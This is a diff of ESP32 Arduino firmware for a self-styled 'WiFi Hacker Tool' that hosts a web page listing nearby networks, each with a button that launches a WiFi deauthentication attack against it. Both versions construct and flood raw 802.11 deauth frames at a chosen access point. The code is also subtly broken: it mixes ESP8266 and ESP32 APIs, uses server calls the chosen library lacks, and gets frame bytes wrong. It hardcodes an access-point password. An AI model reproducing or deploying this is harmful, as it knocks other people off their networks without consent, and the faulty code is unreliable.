@@ -1,309 +1,218 @@
 #include <WiFi.h>
 #include <ESPAsyncWebServer.h>
-#include <SPIFFS.h>
-#include <FS.h>
+#include <AsyncTCP.h>
+#include <ArduinoJson.h>
 
-// Access Point Credentials
-const char* ap_ssid = "bara";
-const char* ap_password = "A7med@Elshab7";
+// Network credentials for AP mode
+const char* ssid = "bara";
+const char* password = "A7med@Elshab7";
 
-// Web Server Setup
+// Web server object
 AsyncWebServer server(80);
 
-// Network Scan Variables
-int scanResult = 0;
-unsigned long lastScanTime = 0;
-const unsigned long scanInterval = 5000; // Scan every 5 seconds
+// Global variables
+String scanResults = "";
+bool isScanning = false;
 
-// Deauthentication Variables
-bool deauthActive = false;
-String targetBssid = "";
-int targetChannel = 1;
+// Helper function to convert MAC to string
+String macToString(const uint8_t *mac) {
+  char buf[18];
+  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return String(buf);
+}
 
-// HTML Content with Hacking Theme
-const char index_html[] PROGMEM = R"rawliteral(
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BARA - WiFi Hacker Tool</title>
-    <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background-color: #0a0a0a;
-            color: #ff3333;
-            margin: 0;
-            padding: 20px;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            text-align: center;
-        }
-        
-        h1 {
-            color: #ff5555;
-            text-shadow: 0 0 10px #ff0000;
-            margin-bottom: 30px;
-            animation: glow 2s infinite alternate;
-        }
-        
-        @keyframes glow {
-            from { text-shadow: 0 0 5px #ff0000; }
-            to { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
-        }
-        
-        .scan-button {
-            background-color: #330000;
-            border: 2px solid #ff3333;
-            color: #ff3333;
-            padding: 15px 30px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 20px 0;
-        }
-        
-        .scan-button:hover {
-            background-color: #550000;
-            box-shadow: 0 0 15px #ff0000;
-        }
-        
-        .network-list {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        
-        .network-list th,
-        .network-list td {
-            border: 1px solid #ff3333;
-            padding: 12px;
-            text-align: left;
-        }
-        
-        .network-list tr:nth-child(even) {
-            background-color: rgba(255, 51, 51, 0.1);
-        }
-        
-        .network-list tr:hover {
-            background-color: rgba(255, 51, 51, 0.3);
-        }
-        
-        .attack-btn {
-            background-color: #330000;
-            border: none;
-            color: #ff3333;
-            padding: 8px 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .attack-btn:hover {
-            background-color: #550000;
-            box-shadow: 0 0 10px #ff0000;
-        }
-        
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        
-        .active {
-            background-color: #ff3333;
-            box-shadow: 0 0 10px #ff0000;
-            animation: pulse 1s infinite;
-        }
-        
-        .inactive {
-            background-color: #444;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        .footer {
-            margin-top: 40px;
-            font-size: 14px;
-            color: #888;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>BARA WiFi Hacker Tool</h1>
-        <p>Developed by Ahmed Nour Ahmed | Qena</p>
-        
-        <button class="scan-button" onclick="startScan()">🔍 Scan Networks</button>
-        
-        <table class="network-list">
-            <thead>
-                <tr>
-                    <th>BSSID</th>
-                    <th>SSID</th>
-                    <th>Signal</th>
-                    <th>Channel</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody id="networkTableBody">
-                <!-- Networks will be populated here -->
-            </tbody>
-        </table>
-        
-        <div id="attackStatus" style="margin-top: 20px;">
-            <span class="status-indicator inactive"></span>
-            <span id="statusText">Ready</span>
-        </div>
-        
-        <div class="footer">
-            <p>BARA - Advanced WiFi Security Tool</p>
-        </div>
-    </div>
+// Handle root URL
+void handleRoot() {
+  String html = "<html>\n<head>\n"
+                "<title>HACKING TOOL - BARA</title>\n"
+                "<style>\n"
+                "body {\n"
+                "  background-color: #1a0000;\n"
+                "  color: #ff3333;\n"
+                "  font-family: \'Courier New\', monospace;\n"
+                "  margin: 0;\n"
+                "  padding: 20px;\n"
+                "}\n"
+                "h1 {\n"
+                "  color: #ff0000;\n"
+                "  text-shadow: 0 0 10px #ff0000;\n"
+                "}\n"
+                ".container {\n"
+                "  max-width: 800px;\n"
+                "  margin: 0 auto;\n"
+                "}\n"
+                ".network-item {\n"
+                "  background-color: rgba(255, 0, 0, 0.1);\n"
+                "  border: 1px solid #ff3333;\n"
+                "  border-radius: 5px;\n"
+                "  padding: 10px;\n"
+                "  margin-bottom: 10px;\n"
+                "}\n"
+                "button {\n"
+                "  background-color: #ff0000;\n"
+                "  color: white;\n"
+                "  border: none;\n"
+                "  padding: 10px 20px;\n"
+                "  border-radius: 5px;\n"
+                "  cursor: pointer;\n"
+                "  margin-right: 10px;\n"
+                "}\n"
+                "button:hover {\n"
+                "  background-color: #cc0000;\n"
+                "}\n"
+                "</style>\n"
+                "</head>\n<body>\n"
+                "<div class=\"container\">\n"
+                "<h1>BARA HACKING TOOL</h1>\n"
+                "<p>Developer: Ahmed Nour Ahmed - Qena</p>\n"
+                "<hr>\n"
+                "<h2>Available Networks</h2>\n"
+                "<button onclick=\"location.reload()\">Refresh Scan</button>\n"
+                "<div id=\"networks\">";
+  
+  if (scanResults.length() > 0) {
+    html += scanResults;
+  } else {
+    html += "<p>No networks found or scan not performed yet.</p>";
+  }
+  
+  html += "</div>\n"
+          "</div>\n"
+          "</body>\n"
+          "</html>";
+          
+  server.send(200, "text/html", html);
+}
 
-    <script>
-        let networks = [];
-        
-        function startScan() {
-            document.getElementById('statusText').textContent = 'Scanning...';
-            fetch('/scan')
-                .then(response => response.json())
-                .then(data => {
-                    networks = data.networks;
-                    updateNetworkTable();
-                    document.getElementById('statusText').textContent = 'Scan Complete';
-                });
-        }
-        
-        function updateNetworkTable() {
-            const tbody = document.getElementById('networkTableBody');
-            tbody.innerHTML = '';
-            
-            networks.forEach(network => {
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>${network.bssid}</td>
-                    <td>${network.ssid || 'Hidden'}</td>
-                    <td>${network.rssi} dBm</td>
-                    <td>${network.channel}</td>
-                    <td><button class="attack-btn" onclick="startAttack('${network.bssid}', ${network.channel})">💥 Attack</button></td>
-                `;
-                tbody.appendChild(row);
-            });
-        }
-        
-        function startAttack(bssid, channel) {
-            if (confirm(`Start deauthentication attack on ${bssid}?`)) {
-                fetch(`/attack?bssid=${bssid}&channel=${channel}`)
-                    .then(() => {
-                        document.getElementById('statusText').textContent = 'Attacking...';
-                        document.querySelector('.status-indicator').classList.remove('inactive');
-                        document.querySelector('.status-indicator').classList.add('active');
-                    });
-            }
-        }
-        
-        // Auto-refresh scan every 30 seconds
-        setInterval(startScan, 30000);
-    </script>
-</body>
-</html>
-)rawliteral";
+// Handle scan request
+void handleScan() {
+  Serial.println("Starting WiFi scan...");
+  isScanning = true;
+  
+  int n = WiFi.scanNetworks(false, false, false, 300, nullptr);
+  
+  if (n == 0) {
+    scanResults = "<p>No networks found</p>";
+  } else {
+    scanResults = "";
+    for (int i = 0; i < n; ++i) {
+      scanResults += "<div class=\"network-item\">\n"
+                     "<strong>" + WiFi.SSID(i) + "</strong><br>\n"
+                     "Signal: " + WiFi.RSSI(i) + " dBm<br>\n"
+                     "MAC: " + macToString(WiFi.BSSID(i)) + "<br>\n"
+                     "Channel: " + WiFi.channel(i) + "<br>\n"
+                     "Encryption: " + getEncryptionType(WiFi.encryptionType(i)) + "\n"
+                     "<form action=\"/deauth\" method=\"get\">\n"
+                     "<input type=\"hidden\" name=\"ssid\" value=\"" + WiFi.SSID(i) + "\">\n"
+                     "<input type=\"hidden\" name=\"bssid\" value=\"" + macToString(WiFi.BSSID(i)) + "\">\n"
+                     "<input type=\"hidden\" name=\"channel\" value=\"" + String(WiFi.channel(i)) + "\">\n"
+                     "<button type=\"submit\">DEAUTH ATTACK</button>\n"
+                     "</form>\n"
+                     "</div>\n";
+    }
+  }
+  
+  isScanning = false;
+  handleRoot();
+}
+
+// Convert encryption type to string
+String getEncryptionType(int type) {
+  switch(type) {
+    case WIFI_AUTH_OPEN: return "Open";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA PSK";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2 PSK";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2 PSK";
+    default: return "Unknown";
+  }
+}
+
+// Handle deauthentication request
+void handleDeauth() {
+  if (server.args() == 0 || !server.hasArg("ssid") || !server.hasArg("bssid") || !server.hasArg("channel")) {
+    server.send(400, "text/plain", "Missing parameters");
+    return;
+  }
+  
+  String ssid = server.arg("ssid");
+  String bssidStr = server.arg("bssid");
+  int channel = server.arg("channel").toInt();
+  
+  server.send(200, "text/plain", "Starting DEAUTH attack on " + ssid + " (" + bssidStr + ") on channel " + String(channel));
+  
+  // Start deauth attack
+  deauthAttack(bssidStr, channel);
+}
+
+// Perform deauthentication attack
+void deauthAttack(String bssidStr, int channel) {
+  Serial.printf("Starting DEAUTH attack on %s (channel %d)\n", bssidStr.c_str(), channel);
+  
+  // Parse BSSID
+  uint8_t bssid[6];
+  sscanf(bssidStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
+         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+  
+  // Change WiFi channel
+  wifi_promiscuous_enable(0); // Disable promiscuous mode
+  wifi_second_chan(WIFI_SECOND_CHAN_NONE);
+  wifi_phy_set_channel(channel, PHY_SET_CHANNEL_ONLY);
+  wifi_promiscuous_enable(1); // Re-enable
+  
+  // Get own MAC address
+  uint8_t myMac[6];
+  WiFi.macAddress(myMac);
+  
+  // Create deauth frame
+  uint8_t deauthFrame[24] = {
+    0x80, 0x0C,       // Frame Control (Deauth)
+    0x00, 0x00,       // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+    myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5], // Source
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
+    0x00, 0x00,       // Sequence Control
+    0x07, 0x00        // Reason Code (7: Deauthenticated because sender is leaving)
+  };
+  
+  // Send deauth frames
+  for (int i = 0; i < 50; i++) {
+    wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), false);
+    delay(10);
+  }
+  
+  Serial.println("DEAUTH attack completed!");
+}
 
 void setup() {
-    Serial.begin(115200);
-    
-    // Initialize SPIFFS
-    if (!SPIFFS.begin(true)) {
-        Serial.println("An error occurred while mounting SPIFFS");
-        return;
-    }
-
-    // Set up Access Point
-    WiFi.softAP(ap_ssid, ap_password);
-    Serial.print("Access Point IP: ");
-    Serial.println(WiFi.softAPIP());
-
-    // Configure Web Server Routes
-    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send_P(200, "text/html", index_html);
-    });
-
-    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
-        String json = performScan();
-        request->send(200, "application/json", json);
-    });
-
-    server.on("/attack", HTTP_GET, [](AsyncWebServerRequest *request) {
-        if (request->hasParam("bssid") && request->hasParam("channel")) {
-            targetBssid = request->getParam("bssid")->value();
-            targetChannel = request->getParam("channel")->value().toInt();
-            deauthActive = true;
-            request->send(200, "text/plain", "Attack started");
-        } else {
-            request->send(400, "text/plain", "Missing parameters");
-        }
-    });
-
-    server.begin();
+  Serial.begin(115200);
+  Serial.println("Starting BARA WiFi Tool...");
+  
+  // Set up AP
+  WiFi.softAP(ssid, password);
+  IPAddress IP = WiFi.softAPIP();
+  Serial.print("AP IP address: ");
+  Serial.println(IP);
+  
+  // Set up web server routes
+  server.on("/", HTTP_GET, handleRoot);
+  server.on("/scan", HTTP_GET, handleScan);
+  server.on("/deauth", HTTP_GET, handleDeauth);
+  
+  // Start server
+  server.begin();
+  Serial.println("HTTP server started");
 }
 
 void loop() {
-    static unsigned long lastDeauthTime = 0;
-    const unsigned long deauthInterval = 100; // Send deauth every 100ms
-    
-    if (deauthActive && millis() - lastDeauthTime > deauthInterval) {
-        sendDeauthFrame(targetBssid.c_str(), targetChannel);
-        lastDeauthTime = millis();
-    }
-}
-
-String performScan() {
-    int n = WiFi.scanNetworks(false, false, false, 100, nullptr);
-    String json = "[";
-    
-    for (int i = 0; i < n; ++i) {
-        if (i > 0) json += ",";
-        json += "{";
-        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
-        json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
-        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
-        json += "\"channel\":" + String(WiFi.channel(i));
-        json += "}";
-    }
-    
-    json += "]";
-    return json;
-}
-
-void sendDeauthFrame(const char* bssid, int channel) {
-    uint8_t deauthPacket[26] = {
-        0xc0, 0x00, // Frame Control (Deauthentication)
-        0x00, 0x00, // Duration
-        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (Broadcast)
-        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source MAC (Random)
-        0x00, 0x00, // Sequence Number
-        0x07, 0x00  // Reason Code (Class 3 frame received from non-associated station)
-    };
-
-    // Replace destination MAC with target BSSID
-    sscanf(bssid, "%02x:%02x:%02x:%02x:%02x:%02x",
-           &deauthPacket[8], &deauthPacket[9], &deauthPacket[10],
-           &deauthPacket[11], &deauthPacket[12], &deauthPacket[13]);
-
-    // Set WiFi to target channel
-    wifi_second_chan_t secondChan = WIFI_SECOND_CHAN_NONE;
-    esp_wifi_set_channel(channel, secondChan);
-
-    // Send deauth packet
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+  // Keep the server running
+  server.handleClient();
+  
+  // Add status indicator
+  static unsigned long lastStatus = 0;
+  if (millis() - lastStatus > 5000) {
+    lastStatus = millis();
+    Serial.printf("Active networks: %d\n", WiFi.scanComplete());
+  }
 }
